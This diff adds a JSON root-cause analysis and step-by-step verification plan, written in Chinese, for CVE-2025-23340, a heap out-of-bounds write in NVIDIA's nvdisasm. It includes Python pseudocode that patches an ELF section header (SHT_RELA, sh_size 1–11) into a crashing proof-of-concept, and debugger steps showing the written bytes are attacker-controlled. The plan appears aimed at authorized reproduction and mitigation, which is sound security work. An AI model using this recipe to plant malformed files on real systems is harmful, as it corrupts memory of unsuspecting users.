@@ -1,0 +1,138 @@
+```json
+{
+  "root_cause_analysis": {
+    "cve_id": "CVE-2025-23340",
+    "cwe_id": "CWE-131",
+    "cuda_attack_surface": "CUDA Toolchain —— CUDA Binary Utilities 中的 nvdisasm（cubin/ELF 反汇编器）的节头解析路径，具体为 SHT_RELA(4) 类型节的处理分支。该路径完全位于用户态 CPU，不经过 CUDA Driver API / Runtime API / GPU 硬件。（分类分歧说明：Talos 归为 CWE-131 缓冲区大小计算错误，NVIDIA 公告 a_id/5661 描述为 out-of-bounds read（CWE-125），而 Talos 的 Valgrind 实测为 Invalid write，即越界写（CWE-787），并伴随 sh_size 的整数/对齐计算问题（CWE-190 相关）。本分析以实测的越界写为准，但保留该分类分歧。）",
+    "vulnerability_class": "incorrect-buffer-size（对齐/尺寸计算错误导致的堆缓冲区溢出；伴随可争议的越界读分类）",
+    "primitive": "OOB-write（堆越界写，3 次 8 字节写，共 0x18 字节，写入内容取自攻击者控制的输入文件字节；由于分配长度为 0 且返回指针已越过 8 字节块的尾部，写起点位于块后偏移 0/8/16）",
+    "root_cause_description": "nvdisasm 在解析 ELF/cubin 的 SHT_RELA 节时，先用节的 sh_size 计算 RELA 条目数量，计算方式是将 sh_size 向下对齐到 Elf64_Rela 条目大小 24 的整数倍。编译器生成的除法-乘法序列为 align(n) = ((((n * 0xaaaaaaaaaaaaaaab) >> 64) >> 3) * 3) << 3，该表达式在 n ∈ [0,11] 时返回 0，在 n ∈ [12,23] 时返回 24。攻击者把某个 SHT_RELA 节的 sh_size 设为 1..11，即令对齐后的长度为 0。随后代码以长度 0 调用内部内存分配函数（0x40a610），该函数内含一个 malloc 包装（0x465700）：先执行 lea rbp,[rdi+0x8] 把请求长度加 8，再 call malloc，最后 add rax,0x8 把返回指针后移 8 字节作为用户指针（前 8 字节留作元数据）。因此 size=0 时实际只分配 8 字节，而返回给调用者的指针已指向这 8 字节块的末尾之外。接下来代码无条件执行 add r14,0x18 并写出 3 个 qword：mov qword [r14-0x18],rax（块后偏移 0）、mov qword [r14-0x8],rsi（偏移 8）、mov qword [r14-0x10],rax（偏移 16）。写入的值（rax 由输入映射中 [rbx]/[rbx+0x4] 组装，rsi 由 movsxd 从输入映射 [rbx-0x4] 符号扩展而来）完全来自被解析的 ELF 文件字节，因此攻击者既控制越界发生（单字段：sh_size）也控制越界写入内容。根本缺陷是：对齐/数量计算缺少下界校验（未拒绝 sh_size < sizeof(Elf64_Rela) 的节），同时分配包装器在 size=0 时返回一个已经越过最小分配块的指针，二者叠加把一次『空分配』变成了确定性的 24 字节堆越界写。",
+    "affected_code_path": "nvdisasm（vulnerable_function 定位地址以 nvdisasm 12.8.90 为准）：SHT_RELA 节处理分支 0x45ada0 → 从节头读取 sh_size（0x45ca86）→ 乘法-移位对齐序列（mov rax,0xaaaaaaaaaaaaaaab; mul rsi; shr rdx,0x3; lea rsi,[rdx+rdx*2]; shl rsi,0x3）→ call sub_40a610（长度=0 的分配入口）→ 内部 malloc 包装 sub_465700（lea rbp,[rdi+0x8]; mov rdi,rbp; call malloc; add rax,0x8）→ 返回后的写入序列（mov eax,[rbx]; mov edx,[rbx+0x4]; add r14,0x18; add rbx,0xc; movsxd rsi,[rbx-0x4]; mov [r14-0x18],rax; mov [r14-0x10],rax; mov [r14-0x8],rsi）。入口为用户命令行 nvdisasm <malformed_elf>。",
+    "controllability": "攻击者对环境有完全的控制：(1) 输入文件的全部字节；(2) 目标节头的 sh_type 必须为 SHT_RELA=4（可把任意已有节的 sh_type 改写为 4，无需骨架中原本存在 RELA 节）；(3) 目标节头 sh_size，触发区间 1..11（0 为边界情形，可能被更早的检查跳过）；(4) 该节的 sh_offset/sh_size 所指向的文件内容决定越界写入的 24 字节数据（rax/rsi 直接来自被映射文件字节）。触发复杂度极低：单字段确定性触发，不涉及竞态、不需要 GPU、不需要驱动、不需要 root，仅需受害者对恶意 ELF 运行 nvdisasm（UI:R）。写入次数与偏移在 sh_size<12 时是固定的（3×8 字节 @ 0/8/16），因此可重复性高。",
+    "relevant_mitigations": [
+      "升级到 CUDA Toolkit 13.0（2025-09-23）或更高版本——官方修复版本，补丁内容未公开",
+      "主机侧 ASLR（堆基址随机化）——不阻止越界写，但提高将越界转为可控破坏/代码执行的难度",
+      "Linux glibc 堆加固：tcache/unsorted bin 一致性检查、safe-linking 指针混淆、malloc 断言，可能把越界写转化为可控 abort 而非任意写",
+      "Windows 堆加固：LFH 元数据校验、Heap 终止行为；以及 DEP/CFG 阻止直接跳转到堆上数据",
+      "二进制加固：PIE/ASLR、RELRO、FORTIFY_SOURCE、Windows /GS（对本次栈外堆写仅间接相关）",
+      "检测类缓解：在 Valgrind/ASan 插桩环境或启用 PageHeap/Application Verifier 的环境中运行 nvdisasm，可把静默越界转为确定性告警",
+      "运行隔离：在低权限账户、容器或 seccomp/AppArmor 沙箱中处理不可信 cubin/ELF，禁止对不可信文件直接调用 nvdisasm",
+      "输入侧防护：在工具链前置校验器/CI 中拒绝 sh_type==SHT_RELA 且 sh_size < 24（甚至 < sizeof(Elf64_Rela)）或 sh_size % sh_entsize != 0 的 ELF 文件",
+      "【不适用】GPU 侧缓解：GPU ECC、MIG 分区、SR-IOV、IOMMU/VT-d、nvidia.ko 加固——本漏洞为纯用户态 CPU 解析缺陷，与 GPU 内存隔离无关，这些措施均不能缓解"
+    ]
+  },
+  "verification_strategy": {
+    "goal": "在受控授权环境中确定性复现 CVE-2025-23340：通过构造 sh_type=SHT_RELA 且 sh_size ∈ [1,11] 的畸形 cubin/ELF，使 nvdisasm 以对齐长度 0 分配缓冲区并执行 3 次 8 字节堆越界写，最终以进程异常退出（Windows 0xC0000005 / Linux SIGSEGV）或 Valgrind Invalid write 作为可观测判定信号，并确认写入内容来源于输入文件字节（攻击者可控）。仅在本地授权测试机上验证存在性与可控性，不追求武器化利用。",
+    "preconditions": [
+      "已安装受影响的 CUDA Toolkit（< 13.0），且 nvdisasm 可执行（实测环境：CUDA Toolkit v11.2 (V11.2.67)，Windows 10 x64；Talos 实测 12.8.90）",
+      "具备 nvcc（用于生成合法 base cubin 骨架）与 readelf/cuobjdump 之一（用于校验节头）",
+      "具备脚本化修改 ELF 节头的能力（Python struct / pyelftools 均可）",
+      "可选：Linux 下的 Valgrind，或 Windows 下的 Application Verifier/PageHeap，用于把静默越界转为确定性告警",
+      "无需任何特权（无需 root/管理员）、无需 GPU 参与触发；本机 GPU（GeForce GTX 1660, sm_75）仅用于生成 base cubin",
+      "仅在获得系统所有者书面授权的测试机上运行，畸形输入不来自不可信来源",
+      "记录测试前的环境快照（工具版本、OS、退出码基线），以便区分『崩溃』与『正常的格式拒绝』"
+    ],
+    "steps": [
+      {
+        "step_id": "S01",
+        "description": "环境指纹与版本确认：确认 nvdisasm 版本落在受影响区间（< CUDA Toolkit 13.0），记录路径与哈希，避免误测已修复版本。",
+        "pseudocode": "nvdisasm --version   # 记录 stdout 与 exit_code\n# Windows 实测路径示例：\n#   C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA\\v11.2\\bin\\nvdisasm.exe\nassert parse_version(stdout) < (13, 0)\nlog(\"CUDA_TOOLKIT=11.2\", \"NVDISASM=\" + version, \"EXIT=\" + exit_code)\n# 同时记录 sha256(nvdisasm 可执行文件) 以便复现",
+        "success_condition": "成功打印版本字符串，解析出的版本号 < 13.0（例如 V11.2.67 或 12.8.90），exit code 为 0。",
+        "failure_condition": "nvdisasm 不存在或不在 PATH 中（命令未找到）；或版本 >= 13.0（已修复，构建失败分支）；或版本字符串无法解析。",
+        "expected_cuda_behavior": "nvdisasm 作为纯用户态 CUDA 工具，直接打印版本并退出，不加载 nvidia 驱动、不创建 CUDA context、不要求 GPU 存在。",
+        "expected_outcome": "得到可复现的受漏洞影响工具实例与版本基线。"
+      },
+      {
+        "step_id": "S02",
+        "description": "生成合法 cubin 骨架并确认/构造 SHT_RELA 节。若骨架中不存在 RELA 节，则把任一非关键节的 sh_type 改写为 4（SHT_RELA），因为解析路径由节头字段驱动。",
+        "pseudocode": "cat > base.cu <<'EOF'\n__global__ void k(int* a){ a[threadIdx.x] = 0x41; }\nEOF\nnvcc -arch=sm_75 -cubin -o base.cubin base.cu\nreadelf -S base.cubin        # 或 cuobjdump -elf base.cubin\n# 查找 sh_type == 4 (SHT_RELA) 的节\n# 若不存在：标记一个非关键节（如 .nv.info 或空的注释节）作为待改写目标\ncp base.cubin base.cubin.orig",
+        "success_condition": "nvcc 编译成功（exit 0），base.cubin 生成；readelf 能列出节头并至少定位到一个可用作 SHT_RELA 改写目标的节索引。",
+        "failure_condition": "nvcc 不可用或编译失败（例如 sm_75 不被当前工具链支持，返回 nvcc fatal 错误）；readelf 无法解析 cubin（非 ELF 容器，如仅 fatbin 包装）。",
+        "expected_cuda_behavior": "nvcc 在无 GPU 的情况下也可离线编译生成 cubin（仅需工具链）；不涉及运行期 CUDA API。",
+        "expected_outcome": "获得结构完整、可被 nvdisasm 正常反汇编的基线 cubin。"
+      },
+      {
+        "step_id": "S03",
+        "description": "解析 ELF 节头表，定位目标节头的字段偏移（ELF64：sh_type 位于节头 +0x04，sh_size 位于 +0x20，两者均需按 e_shentsize 步进），并记录原始值作为对照。",
+        "pseudocode": "import struct\nd = bytearray(open('base.cubin','rb').read())\nassert d[:4] == b'\\x7fELF' and d[4] == 2      # ELFCLASS64\ne_shoff,   = struct.unpack_from('<Q', d, 0x28)\ne_shentsize, e_shnum, e_shstrndx = struct.unpack_from('<HHH', d, 0x3a)\nsecs = []\nfor i in range(e_shnum):\n    off = e_shoff + i*e_shentsize\n    sh_name, sh_type, sh_flags, sh_addr, sh_offset, sh_size = struct.unpack_from('<IIQQQQ', d, off)\n    secs.append(dict(i=i, hdr=off, name=sh_name, type=sh_type, off=sh_offset, size=sh_size))\nprint([s for s in secs])\ntarget = pick_section(secs)   # 优先已有 type==4；否则任选非关键节\ntarget_orig = dict(type=target['type'], size=target['size'], off=target['off'])\nlog(target_orig)",
+        "success_condition": "成功枚举全部节，得到 target 节的节头文件偏移 hdr，并记录其原始 sh_type/sh_size/sh_offset/sh_size>0。",
+        "failure_condition": "e_shoff 为 0 或 e_shnum 为 0（节头表被裁剪）；解析越界抛出 struct.error；文件中不存在适合改写的节。",
+        "expected_cuda_behavior": "此步完全离线，nvdisasm 未参与；仅为后续构造畸形输入做准备。",
+        "expected_outcome": "获得可靠的节头字段补丁点与修改前基线值。"
+      },
+      {
+        "step_id": "S04",
+        "description": "构造 PoC：把目标节 sh_type 设为 SHT_RELA(4)、sh_size 设为 1..11 之间（主用 4），可选地把该节 sh_offset 指向一段填充 0x41 的字节区以标记越界写入内容。另存为 poc.elf。",
+        "pseudocode": "VAL = 4                      # 触发区间 1..11\nFILL = 0x41\np = bytearray(d)\nstruct.pack_into('<I', p, target['hdr'] + 0x04, 4)      # sh_type = SHT_RELA\nstruct.pack_into('<Q', p, target['hdr'] + 0x20, VAL)    # sh_size = 4  (< 12)\n# 可选：在文件尾部追加 0x18 字节 0x41 标记区，并把 sh_offset 指向它\n# struct.pack_into('<Q', p, target['hdr'] + 0x18, len(p)); p += b'\\x41'*0x40\nopen('poc.elf','wb').write(p)\nlog('wrote poc.elf target_sec=%d sh_size=%d' % (target['i'], VAL))",
+        "success_condition": "poc.elf 写出成功；用 readelf/脚本回读确认 sh_type==4 且 sh_size==4（或所选 1..11 值）；文件其余部分与 base.cubin 仅在该节头处不同。",
+        "failure_condition": "节头偏移计算错误导致写坏其他字段（回读校验不一致）；文件被截断；误把 sh_size 写到 sh_offset 位置导致解析路径偏离。",
+        "expected_cuda_behavior": "纯离线字节级修改；不触发任何 CUDA 行为。",
+        "expected_outcome": "获得单字段改写的确定性畸形输入。"
+      },
+      {
+        "step_id": "S05",
+        "description": "基线对照：对未修改的 base.cubin 运行 nvdisasm，确认工具在该输入下正常退出，从而排除『底座 cubin 本身即崩溃』的误判。",
+        "pseudocode": "rc = run(['nvdisasm', 'base.cubin'], capture=True, timeout=60)\nlog(rc.exit_code, rc.stdout[:512], rc.stderr[:512])\nassert rc.exit_code == 0\nassert 'SUPPORTED' not in rc.stderr.upper()",
+        "success_condition": "exit code 为 0，stdout 输出可读的 SASS 反汇编文本，stderr 无 fatal 信息。",
+        "failure_condition": "base.cubin 本身即非零退出（骨架与工具版本不匹配）；或 nvdisasm 提示不支持的 ELF 类型，说明骨架格式不符。",
+        "expected_cuda_behavior": "nvdisasm 正常解析 cubin 并在 CPU 上打印反汇编，不接触 GPU/驱动。",
+        "expected_outcome": "建立干净的对照基线。"
+      },
+      {
+        "step_id": "S06",
+        "description": "触发验证（核心步骤）：对 poc.elf 运行 nvdisasm，捕获退出码/信号并判定是否发生访问违例。注意判定以『异常退出』为准，而非以 stderr 文本（可能先打印 'fatal: poc is not a supported Elf file' 再崩溃）。",
+        "pseudocode": "rc = run(['nvdisasm', 'poc.elf'], capture=True, timeout=60)\nprint('exit_code=0x%X' % rc.raw_exit, 'signal=%s' % rc.signal)\nprint(rc.stderr)\ncrash = (rc.raw_exit == 0xC0000005) or (rc.signal == 11)   # AV / SIGSEGV\nassert crash or rc.raw_exit not in (0, 1)\nlog('[CUDA_STEP:S06] crash=%s exit=0x%X' % (crash, rc.raw_exit))",
+        "success_condition": "进程异常终止：Windows 上退出码 0xC0000005（访问冲突）或 Linux 上 SIGSEGV/SIGABRT；stderr 中可能伴随 'fatal: ... not a supported Elf file'，但异常退出是判定依据。",
+        "failure_condition": "进程以 0 或普通错误码（如 1）正常退出且仅打印格式错误信息——说明走了不同的校验分支（sh_size 值不合适、节被跳过）；或超时/挂起（非预期，需记录为不同失败模式）；或工具版本已修复。",
+        "expected_cuda_behavior": "无 CUDA runtime/driver 调用；进程在 SHT_RELA 解析分支完成 0 长度分配后立即执行越界写，触发用户态访问违例或堆结构破坏后崩溃。",
+        "expected_outcome": "观测到可重复的崩溃，确认漏洞存在。"
+      },
+      {
+        "step_id": "S07",
+        "description": "内存错误精确定位：在 Valgrind（Linux）或 Application Verifier/PageHeap（Windows）下重复 S06，确认越界写的大小、次数与相对偏移，验证『8 字节块之后的 0/8/16 偏移处 3 次 8 字节 Invalid write』这一根因假设。",
+        "pseudocode": "# Linux\nvalgrind --error-exitcode=99 --track-origins=yes nvdisasm poc.elf 2> vg.log\n# 期望日志片段：\n#   Invalid write of size 8  at 0x... : (inside nvdisasm)\n#   Address 0x... is 0 bytes after a block of size 8 alloc'd\n#   Invalid write of size 8  ... 8 bytes after a block of size 8\n#   Invalid write of size 8  ... 16 bytes after a block of size 8\ngrep -c 'Invalid write of size 8' vg.log   # 期望 3\n# Windows 等价：gflags /p /enable nvdisasm.exe /full 后重复 S06",
+        "success_condition": "日志中出现 3 条 'Invalid write of size 8'，其地址分别位于一个 size 8 的分配块之后 0、8、16 字节；分配栈回溯指向 nvdisasm 内的 0x465700 附近（malloc 包装）。",
+        "failure_condition": "只出现 Invalid read（与 NVIDIA 公告的越界读说法一致但与 Talos 实测不符，需记录分类分歧）；或报 'Invalid write of size 4'/其他大小；或 Valgrind 未报错但进程仍崩溃（可能崩溃发生在更晚的堆使用点，需补充 gdb 分析）。",
+        "expected_cuda_behavior": "插桩层仅观测 CPU 堆访问，nvdisasm 行为与无插桩运行时一致；无 CUDA 相关交互。",
+        "expected_outcome": "以内存检测器证据确认越界写的原语类型、尺寸与偏移。"
+      },
+      {
+        "step_id": "S08",
+        "description": "边界扫描：对 sh_size 取 0、1、2、4、8、11、12、23、24、25 逐一复测，验证对齐函数 align(n) 的分段行为（0..11→0 触发；12..23→24 不触发；24..35→48），并确认触发区间与根因模型一致。",
+        "pseudocode": "for n in [0,1,2,4,8,11,12,23,24,25]:\n    p = patch(base, target_hdr, sh_type=4, sh_size=n)\n    write('poc_%d.elf' % n, p)\n    rc = run(['nvdisasm', 'poc_%d.elf' % n], timeout=60)\n    expected_align = ((((n * 0xaaaaaaaaaaaaaaab) >> 64) >> 3) * 3) << 3\n    log('[CUDA_STEP:S08] sh_size=%d align=%d crash=%s exit=0x%X'\n        % (n, expected_align, is_crash(rc), rc.raw_exit))",
+        "success_condition": "sh_size ∈ {1,2,4,8,11} 全部触发崩溃（align 均为 0）；sh_size ∈ {12,23,24,25} 不崩溃（align 为 24/24/48/48）；sh_size=0 记录为边界特例（若被更早校验跳过则记为不触发）。",
+        "failure_condition": "触发边界与 12 不符（例如 12 也崩溃，说明对齐公式或版本实现不同）；或区间内某些值不触发（存在额外的 sh_entsize/sh_offset 校验）；任一情况均需下调置信度并重新建模。",
+        "expected_cuda_behavior": "每个用例为独立的单次工具调用，互不影响；崩溃点应稳定复现在同一代码路径。",
+        "expected_outcome": "实验数据与 align(n) 模型吻合，确认根因假设的单字段触发特性。"
+      },
+      {
+        "step_id": "S09",
+        "description": "可控性验证：把目标节所指向的文件字节替换为可识别的标记（如 0x41 填充或递增值），在 gdb/WinDbg 下于写入序列处断点，检查被越界写入的 24 字节是否等于输入文件中的对应字节，从而证明写入内容攻击者可控。",
+        "pseudocode": "p = bytearray(open('base.cubin','rb').read())\nMARK = bytes(range(0x40, 0x40+0x18))\nsec_off = len(p)\np += MARK\nstruct.pack_into('<Q', p, target['hdr'] + 0x18, sec_off)   # sh_offset -> 标记区\nstruct.pack_into('<I', p, target['hdr'] + 0x04, 4)         # SHT_RELA\nstruct.pack_into('<Q', p, target['hdr'] + 0x20, 4)         # sh_size = 4\nopen('poc_mark.elf','wb').write(p)\n# gdb --args nvdisasm poc_mark.elf\n#   break *0x45ada0+... ; 观察 r14 与 [r14-0x18]/[r14-0x10]/[r14-0x8]\n#   比对写入 qword 是否等于 MARK[0:8]/MARK[8:16]/MARK[16:24] 的对应来源\nassert observed_qwords == expected_from_mark",
+        "success_condition": "断点处观察到的写入值来源于输入文件中攻击者指定的字节（与标记序列对应或由 [rbx]/[rbx+0x4]/[rbx-0x4] 处的输入字节符号扩展得到），证明 24 字节越界写内容完全可控。",
+        "failure_condition": "写入值与该节内容无关（说明数据来源为其他偏移，需修正可控性描述）；或断点无法命中（地址依赖版本，需用符号/字符串定位替代）。",
+        "expected_cuda_behavior": "调试器仅挂接在用户态 CPU 进程上；无 CUDA 驱动交互；断点与硬件无关。",
+        "expected_outcome": "确认可控性结论：发生条件与写入内容均由输入文件决定。"
+      },
+      {
+        "step_id": "S10",
+        "description": "影响面与缓解评估（非武器化）：检查被破坏的堆块相邻对象类型（元数据/指针/vtable），记录在启用 ASLR、glibc 堆加固、Windows LFH 与 DEP/CFG 时的可观测差异，仅用于评估风险等级与缓解有效性，不构造完整利用链。",
+        "pseudocode": "for cfg in [{'asan':False,'aslr':True}, {'asan':True}, {'pageheap':True}]:\n    rc = run_in_env(['nvdisasm','poc.elf'], cfg, timeout=60)\n    log('[CUDA_STEP:S10] cfg=%s crash=%s exit=0x%X' % (cfg, is_crash(rc), rc.raw_exit))\n    note_heap_state(cfg)   # 记录 tcache/safe-linking/LFH 是否把越界转为 abort\nreport(risk='CWE-131 heap OOB write, cvss 7.8 (AV:L/AC:L/PR:N/UI:R)',\n       mitigations_effective=['upgrade to CUDA 13.0', 'sandbox nvdisasm', 'Valgrind/PageHeap detection'],\n       mitigations_irrelevant=['GPU ECC','MIG','IOMMU/VT-d','nvidia.ko hardening'])",
+        "success_condition": "在至少两种加固配置下均观察到越界被检出（崩溃或检测器告警），并明确记录堆加固是否会改变崩溃形态；形成缓解建议清单（升级 + 沙箱 + 输入校验）。",
+        "failure_condition": "所有加固配置下均静默无异常（说明越界被吸收，需回到 S07 用更强检测器复核）；或在测试中出现非预期的系统级不稳定（应立即停止并按授权范围上报）。",
+        "expected_cuda_behavior": "所有配置下 nvdisasm 均为纯用户态进程，GPU/驱动状态不受影响；不发生 GPU hang、Xid 或 TDR。",
+        "expected_outcome": "给出经实验支持的风险结论与可落地的缓解建议，且不产出武器化利用代码。"
+      }
+    ],
+    "confidence": 0.72,
+    "cuda_version_range": "所有低于 CUDA Toolkit 13.0 的版本（13.0 于 2025-09-23 修复）；输入数据给出本机实测 11.2 (V11.2.67)、Talos 实测 12.8.90。注意：该结论来自未核实的检索数据，需在测试机上用 S01 的版本指纹与 S06/S08 的触发结果自行确认。",
+    "gpu_arch_range": "与 GPU 架构无关——nvdisasm 为纯 CPU 用户态工具，触发不需要 GPU 或驱动。仅生成 base cubin 骨架时需要 nvcc 支持某个 sm 目标（数据中实测环境为 sm_75 / GeForce GTX 1660，compute capability 7.5）；理论上任意可编译的 sm 目标均可作为骨架。",
+    "evidence": [
+      "https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2172",
+      "https://nvidia.custhelp.com/app/answers/detail/a_id/5661",
+      "输入数据（未核实）：Talos Valgrind 实测 3 次 Invalid write of size 8，位于 8 字节块之后 0/8/16 字节；函数地址 0x45ada0 / 0x45ca86 / 0x40a610 / 0x465700 对应 nvdisasm 12.8.90",
+      "输入数据（未核实）给出的对齐公式 align(n)=((((n*0xaaaaaaaaaaaaaaab)>>64)>>3)*3)<<3，align(0..11)=0、align(12..23)=24、align(24..35)=48"
+    ]
+  }
+}
+```
